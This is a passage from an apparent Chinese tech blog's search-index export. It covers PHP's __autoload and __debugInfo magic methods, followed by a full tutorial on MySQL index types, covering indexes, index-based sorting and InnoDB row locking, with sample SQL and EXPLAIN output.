看到了吗？不用100个，只是3个看起来就有点烦了。而且这样就会有一个问题：如果脚本执行“条件B”这个分支时，C.php这个文件其实没有必要包含。因为，任何一个被包含的文件，无论是否使用，均会被php引擎编译。如果不使用，却被编译，这样可以被视作一种资源浪费。更进一步，如果C.php包含了D.php，D.php包含了E.php。并且大部分情况都执行“条件B”分支，那么就会浪费一部分资源去编译C.php,D.php,E.php三个“无用”的文件。 那么如果使用 __autoload() 方式呢？ 123456789101112131415161718&lt;?php/** * 文件autoload_demo.php */function __autoload($className) &#123; $filePath = "project/class/&#123;$className&#125;.php"; if (is_readable($filePath)) &#123; require ($filePath); &#125;&#125;if (条件A) &#123; $a = new A(); $b = new B(); $c = new C(); // … 业务逻辑&#125; else if (条件B) &#123; $a = newA(); $b = new B(); // … 业务逻辑&#125; ok,不论效率怎么用，最起码界面看起来舒服多了，没有太多冗余的代。 再来看看这里的效率如何，我们分析下： 当php引擎第一次使用类A，但是找不到时，会自动调用 __autoload 方法，并将类名“A”作为参数传入。所以，我们在 __autoload() 中需要的做的就是根据类名，找到相应的文件，并包含进来，如果我们的方法也找不到，那么php引擎就会报错了。 注意： 这里可以只用require，因为一旦包含进来后，php引擎再遇到类A时，将不会调用__autoload，而是直接使用内存中的类A，不会导致多次包含。 扩展： 其实php发展到今天，已经有将 spl_autoload_register — 注册给定的函数作为 __autoload 的实现了，但是这个不在本文讲解之内，有兴趣可以自行看手册。 __debugInfo()注意： 该方法在PHP 5.6.0及其以上版本才可以用，如果你发现使用无效或者报错，请查看啊你的版本。 看代码： 12345678910111213141516&lt;?phpclass C &#123; private $prop; public function __construct($val) &#123; $this-&gt;prop = $val; &#125; /** * @return array */ public function __debugInfo() &#123; return ['propSquared' =&gt; $this-&gt;prop**2, ]; &#125;&#125;var_dump(new C(42));结果：object(C)#1 (1) &#123; ["propSquared"]=&gt; int(1764) &#125; 再次注意： 这里的 ** 是乘方的意思，也是在PHP5.6.0及其以上才可以使用，详情请查看PHP手册]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[了解MySQL索引与优化]]></title>
    <url>%2Farticles%2F%E4%BA%86%E8%A7%A3MySQL%E7%B4%A2%E5%BC%95%E4%B8%8E%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[写在前面索引对查询的速度有着至关重要的影响，理解索引也是进行数据库性能调优的起点。考虑如下情况，假设数据库中一个表有10^6条记录，DBMS的页面大小为4K，并存储100条记录。如果没有索引，查询将对整个表进行扫描，最坏的情况下，如果所有数据页都不在内存，需要读取10^4个页面，如果这10^4个页面在磁盘上随机分布，需要进行10^4次I/O，假设磁盘每次I/O时间为10ms(忽略数据传输时间)，则总共需要100s(但实际上要好很多很多)。如果对之建立B-Tree索引，则只需要进行log100(10^6)=3次页面读取，最坏情况下耗时30ms。这就是索引带来的效果，很多时候，当你的应用程序进行SQL查询速度很慢时，应该想想是否可以建索引。进入正题： 选择索引的数据类型MySQL支持很多数据类型，选择合适的数据类型存储数据对性能有很大的影响。通常来说，可以遵循以下一些指导原则： 越小的数据类型通常更好：越小的数据类型通常在磁盘、内存和CPU缓存中都需要更少的空间，处理起来更快。 简单的数据类型更好：整型数据比起字符，处理开销更小，因为字符串的比较更复杂。在MySQL中，应该用内置的日期和时间数据类型，而不是用字符串来存储时间；以及用整型数据类型存储IP地址。 尽量避免NULL：应该指定列为NOT NULL，除非你想存储NULL。在MySQL中，含有空值的列很难进行查询优化，因为它们使得索引、索引的统计信息以及比较运算更加复杂。你应该用0、一个特殊的值或者一个空串代替空值。 选择标识符选择合适的标识符是非常重要的。选择时不仅应该考虑存储类型，而且应该考虑MySQL是怎样进行运算和比较的。一旦选定数据类型，应该保证所有相关的表都使用相同的数据类型。 (1) 整型：通常是作为标识符的最好选择，因为可以更快的处理，而且可以设置为AUTO_INCREMENT。 (2) 字符串：尽量避免使用字符串作为标识符，它们消耗更好的空间，处理起来也较慢。而且，通常来说，字符串都是随机的，所以它们在索引中的位置也是随机的，这会导致页面分裂、随机访问磁盘，聚簇索引分裂（对于使用聚簇索引的存储引擎）。 索引入门对于任何DBMS，索引都是进行优化的最主要的因素。对于少量的数据，没有合适的索引影响不是很大，但是，当随着数据量的增加，性能会急剧下降。 如果对多列进行索引(组合索引)，列的顺序非常重要，MySQL仅能对索引最左边的前缀进行有效的查找。例如： 假设存在组合索引it1c1c2(c1,c2)，查询语句 select * from t1 where c1=1 and c2=2 能够使用该索引。查询语句 select * from t1 where c1=1 也能够使用该索引。但是，查询语句 select * from t1 where c2=2 不能够使用该索引，因为没有组合索引的引导列，即，要想使用c2列进行查找，必需出现c1等于某值。 索引是在存储引擎中实现的，而不是在服务器层中实现的。所以，每种存储引擎的索引都不一定完全相同，并不是所有的存储引擎都支持所有的索引类型。 B-Tree索引假设有如下一个表： 1234567CREATE TABLE People ( last_name varchar(50) not null, first_name varchar(50) not null, dob date not null, gender enum('m', 'f') not null, key(last_name, first_name, dob)); 其索引包含表中每一行的last_name、first_name和dob列。其结构大致如下： 索引存储的值按索引列中的顺序排列。可以利用B-Tree索引进行全关键字、关键字范围和关键字前缀查询，当然，如果想使用索引，你必须保证按索引的最左边前缀(leftmost prefix of the index)来进行查询。 (1) 匹配全值(Match the full value)：对索引中的所有列都指定具体的值。例如，上图中索引可以帮助你查找出生于1960-01-01的Cuba Allen。 (2) 匹配最左前缀(Match a leftmost prefix)：你可以利用索引查找last name为Allen的人，仅仅使用索引中的第1列。 (3) 匹配列前缀(Match a column prefix)：例如，你可以利用索引查找last name以J开始的人，这仅仅使用索引中的第1列。 (4) 匹配值的范围查询(Match a range of values)：可以利用索引查找last name在Allen和Barrymore之间的人，仅仅使用索引中第1列。 (5) 匹配部分精确而其它部分进行范围匹配(Match one part exactly and match a range on another part)：可以利用索引查找last name为Allen，而first name以字母K开始的人。 (6) 仅对索引进行查询(Index-only queries)：如果查询的列都位于索引中，则不需要读取元组的值。 由于B-树中的节点都是顺序存储的，所以可以利用索引进行查找(找某些值)，也可以对查询结果进行ORDER BY。当然，使用B-tree索引有以下一些限制： 查询必须从索引的最左边的列开始。关于这点已经提了很多遍了。例如你不能利用索引查找在某一天出生的人。 不能跳过某一索引列。例如，你不能利用索引查找last name为Smith且出生于某一天的人。 存储引擎不能使用索引中范围条件右边的列。例如，如果你的查询语句为 WHERE last_name=”Smith” AND first_name LIKE ‘J%’ AND dob=’1976-12-23’ ，则该查询只会使用索引中的前两列，因为LIKE是范围查询。 Hash索引MySQL中，只有Memory存储引擎显示支持hash索引，是Memory表的默认索引类型，尽管Memory表也可以使用B-Tree索引。Memory存储引擎支持非唯一hash索引，这在数据库领域是罕见的，如果多个值有相同的hash code，索引把它们的行指针用链表保存到同一个hash表项中。 假设创建如下一个表： 12345CREATE TABLE testhash ( fname VARCHAR(50) NOT NULL, lname VARCHAR(50) NOT NULL, KEY USING HASH(fname)) ENGINE=MEMORY; 包含的数据如下： 假设索引使用hash函数f( )，如下： f(&apos;Arjen&apos;) = 2323 f(&apos;Baron&apos;) = 7437 f(&apos;Peter&apos;) = 8784 f(&apos;Vadim&apos;) = 2458此时，索引的结构大概如下： Slots是有序的，但是记录不是有序的。当你执行 SELECT lname FROM testhash WHERE fname=’Peter’; MySQL会计算’Peter’的hash值，然后通过它来查询索引的行指针。因为f(‘Peter’) = 8784，MySQL会在索引中查找8784，得到指向记录3的指针。 因为索引自己仅仅存储很短的值，所以，索引非常紧凑。Hash值不取决于列的数据类型，一个TINYINT列的索引与一个长字符串列的索引一样大。 Hash索引有以下一些限制： 由于索引仅包含hash code和记录指针，所以，MySQL不能通过使用索引避免读取记录。但是访问内存中的记录是非常迅速的，不会对性造成太大的影响。 不能使用hash索引排序。 Hash索引不支持键的部分匹配，因为是通过整个索引值来计算hash值的。 Hash索引只支持等值比较，例如使用=，IN( )和&lt;=&gt;。对于WHERE price&gt;100并不能加速查询。 空间(R-Tree)索引MyISAM支持空间索引，主要用于地理空间数据类型，例如GEOMETRY。 全文(Full-text)索引全文索引是MyISAM的一个特殊索引类型，主要用于全文检索。 高性能的索引策略聚簇索引(Clustered Indexes)聚簇索引保证关键字的值相近的元组存储的物理位置也相同（所以字符串类型不宜建立聚簇索引，特别是随机字符串，会使得系统进行大量的移动操作），且一个表只能有一个聚簇索引。因为由存储引擎实现索引，所以，并不是所有的引擎都支持聚簇索引。目前，只有solidDB和InnoDB支持。 聚簇索引的结构大致如下： 注：叶子页面包含完整的元组，而内节点页面仅包含索引的列(索引的列为整型)。一些DBMS允许用户指定聚簇索引，但是MySQL的存储引擎到目前为止都不支持。InnoDB对主键建立聚簇索引。如果你不指定主键，InnoDB会用一个具有唯一且非空值的索引来代替。如果不存在这样的索引，InnoDB会定义一个隐藏的主键，然后对其建立聚簇索引。一般来说，DBMS都会以聚簇索引的形式来存储实际的数据，它是其它二级索引的基础。 InnoDB和MyISAM的数据布局的比较为了更加理解聚簇索引和非聚簇索引，或者primary索引和second索引(MyISAM不支持聚簇索引)，来比较一下InnoDB和MyISAM的数据布局，对于如下表： 123456CREATE TABLE layout_test ( col1 int NOT NULL, col2 int NOT NULL, PRIMARY KEY(col1), KEY(col2)); 假设主键的值位于1—10,000之间，且按随机顺序插入，然后用OPTIMIZE TABLE进行优化。col2随机赋予1—100之间的值，所以会存在许多重复的值。 (1) MyISAM的数据布局 其布局十分简单，MyISAM按照插入的顺序在磁盘上存储数据，如下： 注：左边为行号(row number)，从0开始。因为元组的大小固定，所以MyISAM可以很容易的从表的开始位置找到某一字节的位置。 据些建立的primary key的索引结构大致如下： 注：MyISAM不支持聚簇索引，索引中每一个叶子节点仅仅包含行号(row number)，且叶子节点按照col1的顺序存储。 来看看col2的索引结构： 实际上，在MyISAM中，primary key和其它索引没有什么区别。Primary key仅仅只是一个叫做PRIMARY的唯一，非空的索引而已。 (2) InnoDB的数据布局 InnoDB按聚簇索引的形式存储数据，所以它的数据布局有着很大的不同。它存储表的结构大致如下： 注：聚簇索引中的每个叶子节点包含primary key的值，事务ID和回滚指针(rollback pointer)——用于事务和MVCC，和余下的列(如col2)。 相对于MyISAM，二级索引与聚簇索引有很大的不同。InnoDB的二级索引的叶子包含primary key的值，而不是行指针(row pointers)，这减小了移动数据或者数据页面分裂时维护二级索引的开销，因为InnoDB不需要更新索引的行指针。其结构大致如下： 聚簇索引和非聚簇索引表的对比： 按primary key的顺序插入行(InnoDB)如果你用InnoDB，而且不需要特殊的聚簇索引，一个好的做法就是使用代理主键(surrogate key)——独立于你的应用中的数据。最简单的做法就是使用一个AUTO_INCREMENT的列，这会保证记录按照顺序插入，而且能提高使用primary key进行连接的查询的性能。应该尽量避免随机的聚簇主键，例如，字符串主键就是一个不好的选择，它使得插入操作变得随机。 覆盖索引(Covering Indexes)如果索引包含满足查询的所有数据，就称为覆盖索引。覆盖索引是一种非常强大的工具，能大大提高查询性能。只需要读取索引而不用读取数据有以下一些优点： 索引项通常比记录要小，所以MySQL访问更少的数据； 索引都按值的大小顺序存储，相对于随机访问记录，需要更少的I/O； 大多数据引擎能更好的缓存索引。比如MyISAM只缓存索引。 覆盖索引对于InnoDB表尤其有用，因为InnoDB使用聚集索引组织数据，如果二级索引中包含查询所需的数据，就不再需要在聚集索引中查找了。 覆盖索引不能是任何索引，只有B-TREE索引存储相应的值。而且不同的存储引擎实现覆盖索引的方式都不同，并不是所有存储引擎都支持覆盖索引(Memory和Falcon就不支持)。 对于索引覆盖查询(index-covered query)，使用EXPLAIN时，可以在Extra一列中看到“Using index”。例如，在sakila的inventory表中，有一个组合索引(store_id,film_id)，对于只需要访问这两列的查询，MySQL就可以使用索引，如下： mysql&gt; EXPLAIN SELECT store_id, film_id FROM sakila.inventory\G *************************** 1. row *************************** id: 1 select_type: SIMPLE table: inventory type: index possible_keys: NULL key: idx_store_id_film_id key_len: 3 ref: NULL rows: 5007 Extra: Using index 1 row in set (0.17 sec)在大多数引擎中，只有当查询语句所访问的列是索引的一部分时，索引才会覆盖。但是，InnoDB不限于此，InnoDB的二级索引在叶子节点中存储了primary key的值。因此，sakila.actor表使用InnoDB，而且对于是last_name上有索引，所以，索引能覆盖那些访问actor_id的查询，如： mysql&gt; EXPLAIN SELECT actor_id, last_name from sakila.actor where last_name = &apos;HOPPER&apos; \G *************************** 1. row *************************** id: 1 select_type: SIMPLE table: actor type: ref possible_keys: idx_actor_last_name key: idx_actor_last_name key_len: 137 ref: const rows: 2 Extra: Using where; Using index利用索引进行排序MySQL中，有两种方式生成有序结果集：一是使用filesort，二是按索引顺序扫描。利用索引进行排序操作是非常快的，而且可以利用同一索引同时进行查找和排序操作。当索引的顺序与ORDER BY中的列顺序相同且所有的列是同一方向(全部升序或者全部降序)时，可以使用索引来排序。如果查询是连接多个表，仅当ORDER BY中的所有列都是第一个表的列时才会使用索引。其它情况都会使用filesort。 123456789101112create table actor( actor_id int unsigned NOT NULL AUTO_INCREMENT, name varchar(16) NOT NULL DEFAULT '', password varchar(16) NOT NULL DEFAULT '', PRIMARY KEY(actor_id), KEY (name) ) ENGINE=InnoDB;/* insert data */insert into actor(name,password) values('cat01','1234567');insert into actor(name,password) values('cat02','1234567');insert into actor(name,password) values('ddddd','1234567');insert into actor(name,password) values('aaaaa','1234567'); mysql&gt; explain select actor_id from actor order by actor_id \G *************************** 1. row *************************** id: 1 select_type: SIMPLE table: actor type: index possible_keys: NULL key: PRIMARY key_len: 4 ref: NULL rows: 4 Extra: Using index 1 row in set (0.00 sec) mysql&gt; explain select actor_id from actor order by password \G *************************** 1. row *************************** id: 1 select_type: SIMPLE table: actor type: ALL possible_keys: NULL key: NULL key_len: NULL ref: NULL rows: 4 Extra: Using filesort 1 row in set (0.00 sec) mysql&gt; explain select actor_id from actor order by name \G *************************** 1. row *************************** id: 1 select_type: SIMPLE table: actor type: index possible_keys: NULL key: name key_len: 18 ref: NULL rows: 4 Extra: Using index 1 row in set (0.00 sec)当MySQL不能使用索引进行排序时，就会利用自己的排序算法(快速排序算法)在内存(sort buffer)中对数据进行排序，如果内存装载不下，它会将磁盘上的数据进行分块，再对各个数据块进行排序，然后将各个块合并成有序的结果集（实际上就是外排序）。对于filesort，MySQL有两种排序算法。 (1)两遍扫描算法(Two passes) 实现方式是先将须要排序的字段和可以直接定位到相关行数据的指针信息取出，然后在设定的内存（通过参数sort_buffer_size设定）中进行排序，完成排序之后再次通过行指针信息取出所需的Columns。 注：该算法是4.1之前采用的算法，它需要两次访问数据，尤其是第二次读取操作会导致大量的随机I/O操作。另一方面，内存开销较小。 (2)一次扫描算法(single pass) 该算法一次性将所需的Columns全部取出，在内存中排序后直接将结果输出。 注：从 MySQL 4.1 版本开始使用该算法。它减少了I/O的次数，效率较高，但是内存开销也较大。如果我们将并不需要的Columns也取出来，就会极大地浪费排序过程所需要的内存。在 MySQL 4.1 之后的版本中，可以通过设置 max_length_for_sort_data 参数来控制 MySQL 选择第一种排序算法还是第二种。当取出的所有大字段总大小大于 max_length_for_sort_data 的设置时，MySQL 就会选择使用第一种排序算法，反之，则会选择第二种。为了尽可能地提高排序性能，我们自然更希望使用第二种排序算法，所以在 Query 中仅仅取出需要的 Columns 是非常有必要的。 当对连接操作进行排序时，如果ORDER BY仅仅引用第一个表的列，MySQL对该表进行filesort操作，然后进行连接处理，此时，EXPLAIN输出“Using filesort”；否则，MySQL必须将查询的结果集生成一个临时表，在连接完成之后进行filesort操作，此时，EXPLAIN输出“Using temporary;Using filesort”。 索引与加锁索引对于InnoDB非常重要，因为它可以让查询锁更少的元组。这点十分重要，因为MySQL 5.0中，InnoDB直到事务提交时才会解锁。有两个方面的原因： 首先，即使InnoDB行级锁的开销非常高效，内存开销也较小，但不管怎么样，还是存在开销。 其次，对不需要的元组的加锁，会增加锁的开销，降低并发性。 InnoDB仅对需要访问的元组加锁，而索引能够减少InnoDB访问的元组数。但是，只有在存储引擎层过滤掉那些不需要的数据才能达到这种目的。一旦索引不允许InnoDB那样做（即达不到过滤的目的），MySQL服务器只能对InnoDB返回的数据进行WHERE操作，此时，已经无法避免对那些元组加锁了：InnoDB已经锁住那些元组，服务器无法解锁了。 来看个例子： 1234567891011121314151617create table actor( actor_id int unsigned NOT NULL AUTO_INCREMENT, name varchar(16) NOT NULL DEFAULT '', password varchar(16) NOT NULL DEFAULT '', PRIMARY KEY(actor_id), KEY (name)) ENGINE=InnoDBinsert into actor(name,password) values('cat01','1234567');insert into actor(name,password) values('cat02','1234567');insert into actor(name,password) values('ddddd','1234567');insert into actor(name,password) values('aaaaa','1234567');SET AUTOCOMMIT=0;BEGIN;SELECT actor_id FROM actor WHERE actor_id &lt; 4AND actor_id &lt;&gt; 1 FOR UPDATE; 该查询仅仅返回2—3的数据，实际已经对1—3的数据加上排它锁了。InnoDB锁住元组1是因为MySQL的查询计划仅使用索引进行范围查询（而没有进行过滤操作，WHERE中第二个条件已经无法使用索引了）： mysql&gt; EXPLAIN SELECT actor_id FROM test.actor where actor_id &lt; 4 and actor_id &lt;&gt; 1 for update \G *************************** 1. row *************************** id: 1 select_type: SIMPLE table: actor type: index possible_keys: PRIMARY key: PRIMARY key_len: 4 ref: NULL rows: 4 Extra: Using where; Using index 1 row in set (0.00 sec) mysql&gt;表明存储引擎从索引的起始处开始，获取所有的行，直到actor_id&lt;4为假，服务器无法告诉InnoDB去掉元组1。 为了证明row 1已经被锁住，我们另外建一个连接，执行如下操作： 12345SET AUTOCOMMIT=0;BEGIN;SELECT actor_id FROM actor WHERE actor_id = 1 FOR UPDATE; 该查询会被挂起，直到第一个连接的事务提交释放锁时，才会执行（这种行为对于基于语句的复制(statement-based replication)是必要的）。 如上所示，当使用索引时，InnoDB会锁住它不需要的元组。更糟糕的是，如果查询不能使用索引，MySQL会进行全表扫描，并锁住每一个元组，不管是否真正需要。]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
</search>
